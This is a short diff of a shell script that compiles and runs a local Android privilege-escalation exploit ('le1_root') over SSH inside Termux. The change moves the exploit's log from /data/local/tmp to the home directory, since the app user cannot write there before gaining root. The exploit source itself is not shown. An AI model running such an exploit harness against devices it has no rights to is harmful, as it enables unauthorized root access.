@@ -52,5 +52,7 @@ ssh_cmd 'clang -O2 -o le1_root le1_root.c' || {
 }
 echo "[*] compiled ok: $(ssh_cmd 'ls -la le1_root')"
 
-echo "[*] Running exploit (log -> /data/local/tmp/le1_root.log)"
-ssh_cmd './le1_root > /data/local/tmp/le1_root.log 2>&1; echo "exploit exit=$?"; echo "--- last 40 log lines ---"; tail -40 /data/local/tmp/le1_root.log'
+echo "[*] Running exploit (log -> ~/le1_root.log, NOT /data/local/tmp: Termux uid cannot write there)"
+# NOTE: /data/local/tmp is 0771 shell:shell — u0_a50 cannot write it pre-root.
+# Log to $HOME (writable), the exploit copies it to /data/local/tmp itself once root.
+ssh_cmd './le1_root > ~/le1_root.log 2>&1; echo "exploit exit=$?"; echo "--- last 40 log lines ---"; tail -40 ~/le1_root.log'
